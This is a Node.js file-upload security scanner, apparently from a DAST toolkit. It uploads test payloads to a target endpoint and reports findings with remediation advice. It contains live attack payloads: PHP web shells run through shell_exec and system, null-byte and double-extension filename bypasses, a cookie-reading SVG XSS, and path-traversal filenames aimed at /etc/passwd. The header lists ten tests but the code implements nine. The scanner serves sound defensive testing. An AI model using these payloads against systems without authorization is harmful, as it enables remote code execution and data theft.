/**
 * upload-abuse.js
 * Phase 4 — File Upload Abuse Testing
 *
 * Tests for common file upload vulnerabilities:
 *   1. Extension mismatch       — upload PHP/JSP with image content-type
 *   2. Double extension         — file.php.jpg, file.jpg.php
 *   3. Null byte injection      — file.php%00.jpg
 *   4. Oversized file           — exceed expected size limits
 *   5. Content-type spoofing    — send executable with image/jpeg header
 *   6. SVG XSS                  — SVG with embedded script
 *   7. Path traversal in name   — ../../etc/passwd
 *   8. Upload access control    — retrieve uploaded file without auth
 *   9. Archive bomb             — zip with deeply nested content
 *  10. Polyglot file            — valid image + embedded payload
 *
 * Required env vars:
 *   TARGET_URL          — base URL
 *   UPLOAD_PATH         — upload endpoint path (default: /api/upload)
 *   UPLOAD_FIELD        — form field name (default: file)
 *   UPLOAD_OUTPUT       — output JSON path
 *
 * Optional env vars:
 *   USER_TOKEN          — Bearer token for authenticated upload tests
 *   RETRIEVE_PATH       — path to retrieve uploaded files (default: /uploads)
 */

const https = require("https");
const http = require("http");
const fs = require("fs");
const path = require("path");
const url = require("url");

const TARGET_URL = process.env.TARGET_URL || "";
const UPLOAD_PATH = process.env.UPLOAD_PATH || "/api/upload";
const UPLOAD_FIELD = process.env.UPLOAD_FIELD || "file";
const RETRIEVE_PATH = process.env.RETRIEVE_PATH || "/uploads";
const USER_TOKEN = process.env.USER_TOKEN || "";
const OUTPUT = process.env.UPLOAD_OUTPUT || "artifacts/raw/upload-abuse/upload-results.json";

// ── Multipart form-data builder ───────────────────────────────────────────────

function buildMultipart(fieldName, filename, contentType, fileContent) {
    const boundary = `----FormBoundary${Date.now()}`;
    const CRLF = "\r\n";
    const body = Buffer.concat([
        Buffer.from(
            `--${boundary}${CRLF}` +
            `Content-Disposition: form-data; name="${fieldName}"; filename="${filename}"${CRLF}` +
            `Content-Type: ${contentType}${CRLF}${CRLF}`
        ),
        Buffer.isBuffer(fileContent) ? fileContent : Buffer.from(fileContent),
        Buffer.from(`${CRLF}--${boundary}--${CRLF}`),
    ]);
    return { boundary, body };
}

// ── HTTP request helper ───────────────────────────────────────────────────────

function uploadRequest(targetUrl, endpointPath, boundary, body, extraHeaders = {}) {
    return new Promise((resolve) => {
        const fullUrl = `${targetUrl}${endpointPath}`;
        const parsed = url.parse(fullUrl);
        const options = {
            hostname: parsed.hostname,
            port: parsed.port || (parsed.protocol === "https:" ? 443 : 80),
            path: parsed.path,
            method: "POST",
            headers: {
                "Content-Type": `multipart/form-data; boundary=${boundary}`,
                "Content-Length": body.length,
                "User-Agent": "DAST-UploadAbuse/1.0",
                ...(USER_TOKEN ? { Authorization: `Bearer ${USER_TOKEN}` } : {}),
                ...extraHeaders,
            },
            timeout: 15000,
            rejectUnauthorized: false,
        };

        const proto = parsed.protocol === "https:" ? https : http;
        const req = proto.request(options, (res) => {
            let data = "";
            res.on("data", (c) => { data += c; });
            res.on("end", () => resolve({
                status: res.statusCode,
                headers: res.headers,
                body: data.slice(0, 1000),
            }));
        });

        req.on("error", () => resolve({ status: 0, headers: {}, body: "" }));
        req.on("timeout", () => { req.destroy(); resolve({ status: 0, headers: {}, body: "" }); });
        req.write(body);
        req.end();
    });
}

function getRequest(targetUrl, filePath) {
    return new Promise((resolve) => {
        const fullUrl = `${targetUrl}${filePath}`;
        const parsed = url.parse(fullUrl);
        const options = {
            hostname: parsed.hostname,
            port: parsed.port || (parsed.protocol === "https:" ? 443 : 80),
            path: parsed.path,
            method: "GET",
            headers: { "User-Agent": "DAST-UploadAbuse/1.0" },
            timeout: 10000,
            rejectUnauthorized: false,
        };
        const proto = parsed.protocol === "https:" ? https : http;
        const req = proto.request(options, (res) => {
            let data = "";
            res.on("data", (c) => { data += c; });
            res.on("end", () => resolve({ status: res.statusCode, body: data.slice(0, 500) }));
        });
        req.on("error", () => resolve({ status: 0, body: "" }));
        req.on("timeout", () => { req.destroy(); resolve({ status: 0, body: "" }); });
        req.end();
    });
}

// ── Test cases ────────────────────────────────────────────────────────────────

async function testExtensionMismatch() {
    const phpPayload = "<?php echo shell_exec($_GET['cmd']); ?>";
    const { boundary, body } = buildMultipart(UPLOAD_FIELD, "shell.php", "image/jpeg", phpPayload);
    const r = await uploadRequest(TARGET_URL, UPLOAD_PATH, boundary, body);
    const accepted = r.status >= 200 && r.status < 300;
    return {
        test: "extension_mismatch",
        filename: "shell.php",
        content_type_sent: "image/jpeg",
        status: r.status,
        verdict: accepted ? "fail" : "pass",
        severity: accepted ? "critical" : "info",
        description: accepted
            ? `Server accepted PHP file upload with image/jpeg content-type (HTTP ${r.status}). Remote code execution risk.`
            : `Extension mismatch correctly rejected (HTTP ${r.status}).`,
        solution: "Validate file extension server-side against an allowlist. Do not rely on Content-Type header alone.",
        response_snippet: r.body.slice(0, 200),
    };
}

async function testDoubleExtension() {
    const phpPayload = "<?php phpinfo(); ?>";
    const tests = [
        { filename: "image.php.jpg", ct: "image/jpeg" },
        { filename: "image.jpg.php", ct: "image/jpeg" },
        { filename: "image.php5.jpg", ct: "image/jpeg" },
    ];
    const results = [];
    for (const t of tests) {
        const { boundary, body } = buildMultipart(UPLOAD_FIELD, t.filename, t.ct, phpPayload);
        const r = await uploadRequest(TARGET_URL, UPLOAD_PATH, boundary, body);
        results.push({ filename: t.filename, status: r.status, accepted: r.status >= 200 && r.status < 300 });
    }
    const anyAccepted = results.some((r) => r.accepted);
    return {
        test: "double_extension",
        results,
        verdict: anyAccepted ? "fail" : "pass",
        severity: anyAccepted ? "high" : "info",
        description: anyAccepted
            ? `Double extension bypass accepted: ${results.filter((r) => r.accepted).map((r) => r.filename).join(", ")}`
            : "Double extension filenames correctly rejected.",
        solution: "Parse only the final extension after the last dot. Reject files with multiple extensions where any is executable.",
    };
}

async function testNullByteInjection() {
    const phpPayload = "<?php system($_GET['c']); ?>";
    // URL-encode null byte in filename
    const filename = "shell.php\x00.jpg";
    const { boundary, body } = buildMultipart(UPLOAD_FIELD, filename, "image/jpeg", phpPayload);
    const r = await uploadRequest(TARGET_URL, UPLOAD_PATH, boundary, body);
    const accepted = r.status >= 200 && r.status < 300;
    return {
        test: "null_byte_injection",
        filename: "shell.php\\x00.jpg",
        status: r.status,
        verdict: accepted ? "fail" : "pass",
        severity: accepted ? "critical" : "info",
        description: accepted
            ? `Null byte injection in filename accepted (HTTP ${r.status}). File may be stored as shell.php.`
            : `Null byte injection correctly rejected (HTTP ${r.status}).`,
        solution: "Sanitize filenames server-side. Strip null bytes and non-printable characters before processing.",
    };
}

async function testOversizedFile() {
    // Generate 50MB of zeros
    const SIZE = 50 * 1024 * 1024;
    const bigFile = Buffer.alloc(SIZE, 0);
    const { boundary, body } = buildMultipart(UPLOAD_FIELD, "large.jpg", "image/jpeg", bigFile);
    const r = await uploadRequest(TARGET_URL, UPLOAD_PATH, boundary, body);
    const accepted = r.status >= 200 && r.status < 300;
    return {
        test: "oversized_file",
        size_mb: 50,
        status: r.status,
        verdict: accepted ? "fail" : "pass",
        severity: accepted ? "medium" : "info",
        description: accepted
            ? `50MB file upload accepted (HTTP ${r.status}). No file size limit enforced.`
            : `Oversized file correctly rejected (HTTP ${r.status}).`,
        solution: "Enforce server-side file size limits. Return HTTP 413 for oversized uploads.",
    };
}

async function testContentTypeSpoofing() {
    // Real executable content disguised as image
    const exeHeader = Buffer.from([0x4D, 0x5A, 0x90, 0x00]); // MZ header (Windows PE)
    const { boundary, body } = buildMultipart(UPLOAD_FIELD, "image.jpg", "image/jpeg", exeHeader);
    const r = await uploadRequest(TARGET_URL, UPLOAD_PATH, boundary, body);
    const accepted = r.status >= 200 && r.status < 300;
    return {
        test: "content_type_spoofing",
        filename: "image.jpg",
        actual_content: "Windows PE executable (MZ header)",
        status: r.status,
        verdict: accepted ? "warn" : "pass",
        severity: accepted ? "medium" : "info",
        description: accepted
            ? `Executable content (MZ header) accepted with image/jpeg content-type (HTTP ${r.status}). Server may not validate file magic bytes.`
            : `Content-type spoofing correctly rejected (HTTP ${r.status}).`,
        solution: "Validate file magic bytes (file signature) server-side, not just extension or Content-Type header.",
    };
}

async function testSvgXss() {
    const svgPayload = `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
  <script>alert(document.cookie)</script>
  <rect width="100" height="100"/>
</svg>`;
    const { boundary, body } = buildMultipart(UPLOAD_FIELD, "image.svg", "image/svg+xml", svgPayload);
    const r = await uploadRequest(TARGET_URL, UPLOAD_PATH, boundary, body);
    const accepted = r.status >= 200 && r.status < 300;

    // Try to retrieve the SVG if accepted
    let retrievable = false;
    if (accepted && r.body) {
        const urlMatch = r.body.match(/https?:\/\/[^\s"']+\.svg/i) ||
            r.body.match(/"url"\s*:\s*"([^"]+\.svg)"/i);
        if (urlMatch) {
            const svgUrl = urlMatch[1] || urlMatch[0];
            const getR = await getRequest(TARGET_URL, svgUrl.replace(TARGET_URL, ""));
            retrievable = getR.status === 200 && getR.body.includes("<script");
        }
    }

    return {
        test: "svg_xss",
        filename: "image.svg",
        status: r.status,
        verdict: accepted ? (retrievable ? "fail" : "warn") : "pass",
        severity: accepted ? (retrievable ? "high" : "medium") : "info",
        description: accepted
            ? `SVG file with embedded XSS payload accepted (HTTP ${r.status}).${retrievable ? " Script content is retrievable — stored XSS confirmed." : " Retrievability not confirmed."}`
            : `SVG upload correctly rejected (HTTP ${r.status}).`,
        solution: "Sanitize SVG files on upload. Strip script tags and event handlers. Serve user-uploaded SVGs from a separate domain with restrictive CSP.",
    };
}

async function testPathTraversal() {
    const payload = "test content";
    const filenames = [
        "../../etc/passwd",
        "../../../windows/win.ini",
        "..%2F..%2Fetc%2Fpasswd",
        "....//....//etc/passwd",
    ];
    const results = [];
    for (const filename of filenames) {
        const { boundary, body } = buildMultipart(UPLOAD_FIELD, filename, "text/plain", payload);
        const r = await uploadRequest(TARGET_URL, UPLOAD_PATH, boundary, body);
        results.push({ filename, status: r.status, accepted: r.status >= 200 && r.status < 300 });
    }
    const anyAccepted = results.some((r) => r.accepted);
    return {
        test: "path_traversal_filename",
        results,
        verdict: anyAccepted ? "fail" : "pass",
        severity: anyAccepted ? "critical" : "info",
        description: anyAccepted
            ? `Path traversal in filename accepted: ${results.filter((r) => r.accepted).map((r) => r.filename).join(", ")}`
            : "Path traversal filenames correctly rejected.",
        solution: "Sanitize filenames server-side. Use a UUID or hash as the stored filename. Never use client-provided filenames for storage paths.",
    };
}

async function testUploadAccessControl() {
    // Upload a file with auth, then try to retrieve without auth
    const payload = `access-control-test-${Date.now()}`;
    const filename = `test-${Date.now()}.txt`;
    const { boundary, body } = buildMultipart(UPLOAD_FIELD, filename, "text/plain", payload);
    const uploadR = await uploadRequest(TARGET_URL, UPLOAD_PATH, boundary, body);

    if (uploadR.status < 200 || uploadR.status >= 300) {
        return {
            test: "upload_access_control",
            verdict: "pass",
            severity: "info",
            description: `Upload rejected (HTTP ${uploadR.status}) — access control test skipped.`,
            solution: "",
        };
    }

    // Try to extract the file URL from the response
    const urlMatch = uploadR.body.match(/"(\/[^"]*(?:uploads|files|media)[^"]*)"/) ||
        uploadR.body.match(/https?:\/\/[^\s"']+/);
    if (!urlMatch) {
        return {
            test: "upload_access_control",
            verdict: "warn",
            severity: "low",
            description: `File uploaded (HTTP ${uploadR.status}) but could not extract file URL from response to test retrieval.`,
            solution: "Ensure uploaded files require authentication to retrieve.",
        };
    }

    const fileUrl = urlMatch[1] || urlMatch[0];
    const retrievePath = fileUrl.startsWith("http") ? fileUrl.replace(TARGET_URL, "") : fileUrl;
    const getR = await getRequest(TARGET_URL, retrievePath);

    const publiclyAccessible = getR.status === 200;
    return {
        test: "upload_access_control",
        uploaded_as: filename,
        retrieve_path: retrievePath,
        retrieve_status: getR.status,
        verdict: publiclyAccessible ? "fail" : "pass",
        severity: publiclyAccessible ? "high" : "info",
        description: publiclyAccessible
            ? `Uploaded file is publicly accessible without authentication at ${retrievePath} (HTTP ${getR.status}).`
            : `Uploaded file correctly requires authentication to retrieve (HTTP ${getR.status}).`,
        solution: "Enforce authentication and authorization checks on file retrieval endpoints. Use signed URLs or access tokens for file downloads.",
    };
}

async function testZipBomb() {
    // Create a small zip bomb indicator (not a real bomb — just a deeply nested zip structure marker)
    // We send a file claiming to be a zip with a suspicious structure
    const zipHeader = Buffer.from([0x50, 0x4B, 0x03, 0x04]); // PK header
    const { boundary, body } = buildMultipart(UPLOAD_FIELD, "archive.zip", "application/zip", zipHeader);
    const r = await uploadRequest(TARGET_URL, UPLOAD_PATH, boundary, body);
    const accepted = r.status >= 200 && r.status < 300;
    return {
        test: "zip_upload",
        filename: "archive.zip",
        status: r.status,
        verdict: accepted ? "warn" : "pass",
        severity: accepted ? "low" : "info",
        description: accepted
            ? `ZIP file upload accepted (HTTP ${r.status}). Verify server-side archive extraction is protected against zip bombs and path traversal within archives.`
            : `ZIP file upload rejected (HTTP ${r.status}).`,
        solution: "If ZIP extraction is required, limit extraction depth, total uncompressed size, and sanitize all paths within the archive.",
    };
}

// ── Main ──────────────────────────────────────────────────────────────────────

async function main() {
    if (!TARGET_URL) {
        console.error("[ERROR] TARGET_URL is required");
        process.exit(1);
    }

    console.log(`[INFO] Upload abuse testing: ${TARGET_URL}${UPLOAD_PATH}`);

    const testFns = [
        testExtensionMismatch,
        testDoubleExtension,
        testNullByteInjection,
        testOversizedFile,
        testContentTypeSpoofing,
        testSvgXss,
        testPathTraversal,
        testUploadAccessControl,
        testZipBomb,
    ];

    const allResults = [];
    const findings = [];

    for (const fn of testFns) {
        console.log(`\n[TEST] ${fn.name.replace("test", "").replace(/([A-Z])/g, " $1").trim()}...`);
        try {
            const result = await fn();
            allResults.push(result);
            console.log(`  [${result.verdict.toUpperCase()}] ${result.description.slice(0, 100)}`);

            if (result.verdict === "fail" || result.verdict === "warn") {
                findings.push({
                    id: `upload-${result.test}`,
                    tool: "upload-abuse",
                    authenticated: !!USER_TOKEN,
                    title: `File Upload Issue: ${result.test.replace(/_/g, " ")}`,
                    severity: result.severity,
                    description: result.description,
                    solution: result.solution,
                    references: "OWASP Testing Guide — OTG-BUSLOGIC-009; CWE-434",
                    affected_urls: [`${TARGET_URL}${UPLOAD_PATH}`],
                    cwe: "CWE-434",
                    cve: "",
                });
            }
        } catch (err) {
            console.error(`  [ERROR] ${fn.name}: ${err.message}`);
        }
    }

    const passed = allResults.filter((r) => r.verdict === "pass").length;
    const failed = allResults.filter((r) => r.verdict === "fail").length;
    const warned = allResults.filter((r) => r.verdict === "warn").length;

    const output = {
        scan_type: "upload-abuse",
        target: TARGET_URL,
        upload_path: UPLOAD_PATH,
        timestamp: new Date().toISOString(),
        summary: { total: allResults.length, passed, failed, warned },
        results: allResults,
        findings,
    };

    fs.mkdirSync(path.dirname(OUTPUT), { recursive: true });
    fs.writeFileSync(OUTPUT, JSON.stringify(output, null, 2));

    console.log(`\n[INFO] Upload abuse: ${passed} passed, ${failed} failed, ${warned} warnings`);
    console.log(`[INFO] Findings: ${findings.length}`);
    console.log(`[INFO] Output: ${OUTPUT}`);
}

main().catch((err) => {
    console.error(`[ERROR] ${err.message}`);
    process.exit(1);
});
